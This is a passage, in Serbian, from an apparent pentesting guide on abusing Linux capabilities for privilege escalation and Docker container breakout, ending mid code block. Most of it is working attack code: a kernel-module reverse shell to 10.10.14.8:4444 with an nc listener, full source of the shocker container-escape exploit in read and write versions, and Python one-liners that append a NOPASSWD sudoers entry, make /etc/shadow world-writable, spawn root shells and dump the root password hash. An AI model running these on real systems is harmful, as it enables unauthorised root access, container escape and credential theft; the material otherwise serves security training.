Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Unutar prethodnog izlaza možete videti da je mogućnost **SYS_MODULE** omogućena.<sup>[[14]](#references)</sup>

**Kreirajte** **kernel module** koji će izvršiti reverse shell i **Makefile** za njegovu **kompilaciju**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Prazan znak pre svake reči u Makefile-u **mora biti tabulator, a ne razmaci**!

Izvršite `make` da biste ga kompajlirali.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Na kraju, pokrenite `nc` unutar shell-a i **učitajte modul** iz drugog shell-a i uhvatićete shell u nc procesu:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Kod ove tehnike je preuzet iz laboratorije „Abusing SYS_MODULE Capability“ sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Još jedan primer ove tehnike može se pronaći na [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **zaobiđe dozvole za čitanje fajlova, kao i za čitanje i izvršavanje direktorijuma**. Njegova primarna namena je pretraga ili čitanje fajlova. Međutim, takođe omogućava procesu da koristi funkciju `open_by_handle_at(2)`, koja može da pristupi bilo kom fajlu, uključujući one izvan mount namespace-a procesa. Handle koji se koristi u funkciji `open_by_handle_at(2)` trebalo bi da bude netransparentni identifikator dobijen pomoću funkcije `name_to_handle_at(2)`, ali može da sadrži osetljive informacije, kao što su inode brojevi, koji su podložni izmeni. Potencijal za eksploataciju ove capability, naročito u kontekstu Docker kontejnera, demonstrirao je Sebastian Krahmer pomoću shocker exploita, što je analizirano [ovde](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**To znači da možete zaobići provere dozvola za čitanje fajlova, kao i provere dozvola za čitanje i izvršavanje direktorijuma**.<sup>[[14]](#references)</sup>

**Primer sa binarnim fajlom**

Binarni fajl može da čita fajlove kojima je moguće pristupiti iz njegovih namespace-ova. Dakle, ako fajl kao što je `tar` ima ovu capability, može da pročita shadow fajl:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Primer sa binary2**

U ovom slučaju pretpostavimo da binarni fajl **`python`** ima ovu capability. Da biste izlistali root fajlove, možete uraditi:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
A da biste pročitali datoteku, mogli biste da uradite:
```python
print(open("/etc/shadow", "r").read())
```
**Primer u okruženju (Docker breakout)**

Možete proveriti omogućene capabilities unutar Docker kontejnera pomoću `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
U prethodnom izlazu možete videti da je capability **DAC_READ_SEARCH** omogućena. Ovo zaobilazi DAC provere čitanja/pretrage i omogućava `open_by_handle_at(2)`; sama po sebi nije capability za debugging procesa.<sup>[[14]](#references)</sup>

Možete saznati kako sledeći exploit funkcioniše na [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ali ukratko, **CAP_DAC_READ_SEARCH** omogućava prolazak kroz fajl sistem bez provera dozvola i omogućava `open_by_handle_at(2)`; ovo može izložiti fajlove koje su otvorili drugi procesi kada su odgovarajući namespaces i mounts dostupni.<sup>[[13]](#references)[[14]](#references)</sup>

Originalni exploit koji zloupotrebljava ove dozvole za čitanje fajlova sa hosta može se pronaći ovde: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); sledeće je **izmenjena verzija koja omogućava da fajl koji treba pročitati prosledite kao prvi argument i upišete rezultat u fajl**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit mora da pronađe pokazivač ka nečemu što je montirano na hostu. Originalni exploit je koristio datoteku /.dockerinit, dok ova izmenjena verzija koristi /etc/hostname. Ako exploit ne radi, možda treba da postavite drugu datoteku. Da biste pronašli datoteku koja je montirana na hostu, samo izvršite mount komandu:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit mora da pronađe pokazivač ka nečemu što je montirano na hostu. Originalni exploit je koristio datoteku /.dockerinit, dok ova izmenjena verzija koristi...](<../../images/image (407) (1).png>)

**Kod ove tehnike je preuzet iz laboratorije „Abusing DAC_READ_SEARCH Capability“ sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Ova capability zaobilazi provere dozvola za čitanje, pisanje i izvršavanje datoteka**.<sup>[[14]](#references)</sup>

Potražite datoteke koje postaju dostupne za čitanje ili pisanje članstvom u privilegovanoj grupi; korisne mete zavise od vlasništva nad metom i njenih bitova režima.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

U ovom primeru vim ima ovu capability, pa možete da izmenite bilo koju datoteku, kao što su _passwd_, _sudoers_ ili _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Primer sa binarnim fajlom 2**

U ovom primeru **`python`** binary će imati ovu capability. Možete koristiti python da prepišete bilo koji fajl:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Primer sa okruženjem + CAP_DAC_READ_SEARCH (Docker breakout)**

Potvrdite `CAP_DAC_OVERRIDE` pomoću `capsh --print`, kao što je prikazano u prethodnom primeru okruženja `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Pre svega pročitajte prethodni odeljak koji [**zloupotrebljava DAC_READ_SEARCH capability za čitanje proizvoljnih datoteka**](linux-capabilities.md#cap_dac_read_search) hosta i **kompajlirajte** exploit.\
Zatim, **kompajlirajte sledeću verziju shocker exploita** koja će vam omogućiti da **upisujete proizvoljne datoteke** unutar filesystema hosta:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Da biste **izašli iz Docker kontejnera**, mogli biste da **preuzmete** datoteke `/etc/shadow` i `/etc/passwd` sa hosta, da im **dodate** **novog korisnika** i da upotrebite **`shocker_write`** kako biste ih prepisali. Zatim možete da **pristupite** putem **ssh**.

**Kod ove tehnike je kopiran iz laboratorije „Abusing DAC_OVERRIDE Capability“ sa** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Ova capability omogućava procesu da promeni vlasništvo nad datotekama**.<sup>[[14]](#references)</sup>

**Primer sa binarnim fajlom**

Pretpostavimo da **`python`** binary ima ovu capability; možete promeniti vlasnika datoteke kao što je **`shadow`**, a zatim iskoristiti dobijeni pristup da je izmenite ako druge dozvole to omogućavaju:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ili ako **`ruby`** binary ima ovu capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Ova capability zaobilazi provere vlasništva za mnoge operacije nad fajlovima, uključujući menjanje dozvola**.<sup>[[14]](#references)</sup>

**Primer sa binarnim fajlom**

Ako python ima ovu capability, možete izmeniti dozvole shadow fajla, **promeniti root lozinku** i eskalirati privilegije:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Ova capability omogućava procesu da promeni svoj efektivni ID korisnika, u skladu sa pravilima za kredencijale i capability koje primenjuje kernel**.<sup>[[14]](#references)</sup>

**Primer sa binarnim fajlom**

Ako python ima ovu **capability**, možete je veoma lako zloupotrebiti za privilege escalation na root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Drugi način:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Ova capability omogućava procesu da promeni svoj effective group ID, u skladu sa pravilima za credentials i capabilities koja sprovodi kernel**.<sup>[[14]](#references)</sup>

Postoji mnogo fajlova koje možete **overwrite-ovati radi eskalacije privilegija,** [**ideje možete pronaći ovde**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Primer sa binary fajlom**

U ovom slučaju treba da potražite interesantne fajlove koje neka grupa može da čita, jer možete da se impersonate-ujete kao bilo koja grupa:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Kada pronađete fajl koji možete zloupotrebiti (čitanjem ili pisanjem) za eskalaciju privilegija, možete **dobiti shell koji se predstavlja kao interesantna grupa** pomoću:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
U ovom slučaju je izvršeno impersoniranje grupe shadow, pa možete da pročitate fajl `/etc/shadow`:
```bash
cat /etc/shadow
```
### Kombinovani lanac: CAP_SETGID + CAP_CHOWN

Kada su obe capabilities dostupne u istom helper-u, praktičan lanac je:

1. Prebacite EGID na `shadow` (ili drugu privilegovanu grupu).
2. Upotrebite `chown` na `/etc/shadow` da postavite svoj UID, uz zadržavanje grupe `shadow`.
3. Pročitajte ciljni hash i izvršite crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Ovo izbegava potrebu za direktnim potpunim root pristupom i obično je dovoljno za pivotiranje kroz ponovnu upotrebu akreditiva.

Ako je **docker** instaliran, možete **impersonate** grupu **docker** i zloupotrebiti je za komunikaciju sa [**docker socket**-om i eskalaciju privilegija](#writable-docker-socket).

## CAP_SETFCAP

**Ova capability omogućava procesu da postavi file capabilities**.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Ako Python ima ovu **capability**, možete je veoma lako zloupotrebiti za eskalaciju privilegija na root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Novi skup capability-ja upisan u fajl zamenjuje prethodni skup; ako se helper zatim izvrši samo sa novim capability-jima, možda više neće zadržati `CAP_SETFCAP` za ažuriranje drugog fajla.<sup>[[14]](#references)[[25]](#references)</sup>

Kada dobijete [SETUID capability](linux-capabilities.md#cap_setuid), možete preći na njegov odeljak da vidite kako da eskalirate privilegije.

**Primer sa environment-om (Docker breakout)**

Dokumentovani podrazumevani skup capability-ja za Docker uključuje **CAP_SETFCAP**, ali stvarni skup zavisi od runtime konfiguracije.<sup>[[19]](#references)</sup>
Capability-je procesa možete proveriti pomoću:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ova capability omogućava upisivanje file capabilities, ali sama po sebi ne dodeljuje te capabilities trenutnom procesu niti zaobilazi pravila za file, bounding-set i namespace koja se primenjuju prilikom izvršavanja fajla.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Dozvoljene capabilities datoteke ograničene su procesovim capability bounding set-om, a effective bit datoteke kontroliše da li se permitted set datoteke dodaje u effective set procesa. Zbog toga dodavanje capabilities datoteci ne čini automatski svaku zahtevanu capability upotrebljivom tokom izvršavanja.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava brojne osetljive operacije, uključujući pristup datotekama `/dev/mem`, `/dev/kmem` ili `/proc/kcore`, izmenu `mmap_min_addr`, pristup system call-ovima `ioperm(2)` i `iopl(2)`, kao i različitim disk commands. `FIBMAP ioctl(2)` je takođe omogućen putem ove capability, što je ranije izazivalo probleme u [prošlosti](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Prema man stranici, ovo holder-u takođe omogućava izvršavanje niza device-specific operacija nad drugim uređajima.<sup>[[14]](#references)</sup>

Ovo može biti korisno za **privilege escalation** i **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**Ova capability zaobilazi provere dozvola pri slanju signal-a procesima u slučajevima koje definiše kernel**.<sup>[[14]](#references)</sup>

**Primer sa binary-jem**

Pretpostavimo da **`python`** binary ima ovu capability. Ako biste mogli da **izmenite i neku service ili socket configuration** datoteku (ili bilo koju configuration datoteku povezanu sa service-om), mogli biste da je backdoor-ujete, a zatim ubijete proces povezan sa tim service-om i sačekate da se nova configuration datoteka izvrši sa vašim backdoor-om.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc pomoću kill**

Ako imate kill capabilities i postoji **node program running as root** (ili kao drugi user), verovatno biste mogli da mu **send** signal **SIGUSR1** i naterate ga da **open the node debugger**, na koji se možete povezati.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Ova capability omogućava vezivanje za Internet portove ispod 1024.** Ne omogućava direktno širu eskalaciju privilegija.<sup>[[14]](#references)</sup>

**Primer sa binaryjem**

Ako **`python`** ima ovu capability, moći će da sluša na bilo kom portu i čak da se sa njega poveže na bilo koji drugi port (neki servisi zahtevaju povezivanje sa portova sa određenim privilegijama)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesima da **kreiraju RAW i PACKET sockets**, što im omogućava generisanje i slanje proizvoljnih mrežnih paketa. To može dovesti do bezbednosnih rizika u kontejnerizovanim okruženjima, kao što su spoofing paketa, ubacivanje saobraćaja i zaobilaženje kontrola pristupa mreži. Maliciozni akteri bi ovo mogli da iskoriste za ometanje rutiranja kontejnera ili ugrožavanje bezbednosti mreže hosta, naročito bez odgovarajuće firewall zaštite. Pored toga, **CAP_NET_RAW** podržava operacije poput ping-a putem RAW ICMP zahteva.<sup>[[14]](#references)</sup>

**Ovo može omogućiti capture paketa pomoću odgovarajućeg socket interfejsa.** Ne omogućava direktno širu eskalaciju privilegija.<sup>[[14]](#references)</sup>

**Primer sa binary**

Ako binary **`tcpdump`** ima ovu capability, moći ćete da ga koristite za capture mrežnih informacija.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Ako **environment** dodeli ovu capability, **`tcpdump`** takođe može da je koristi za sniffing saobraćaja.<sup>[[14]](#references)</sup>

**Primer sa binary 2**

Sledeći primer je kod u **`python2`** jeziku koji može biti koristan za presretanje saobraćaja interfejsa "**lo**" (**localhost**). Kod potiče iz laboratorijske vežbe "_The Basics: CAP-NET_BIND + NET_RAW_" sa [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) daje vlasniku mogućnost da **menja mrežne konfiguracije**, uključujući podešavanja firewall-a, routing tabele, dozvole socket-a i podešavanja mrežnih interfejsa unutar izloženih network namespace-ova. Takođe omogućava uključivanje **promiscuous mode**-a na mrežnim interfejsima, što dozvoljava sniffing paketa kroz namespace-ove.<sup>[[14]](#references)</sup>

**Primer sa binary-em**

Pretpostavimo da **python binary** ima ove capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Ova capability omogućava izmene inode zastavica, kao što su immutable i append-only. Ona direktno ne daje šire privilegije za eskalaciju privilegija.**<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Ako utvrdite da je datoteka immutable, a python ima ovu capability, možete **ukloniti atribut immutable i učiniti datoteku izmenjivom:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Operacije `FS_IOC_GETFLAGS` i `FS_IOC_SETFLAGS` čitaju i ažuriraju inode zastavice; `FS_IMMUTABLE_FL` je immutable zastavica koja se uklanja u ovom primeru.<sup>[[27]](#references)</sup>

> [!TIP]
> Imajte na umu da se ovaj immutable atribut obično postavlja i uklanja pomoću:
>
> ```bash
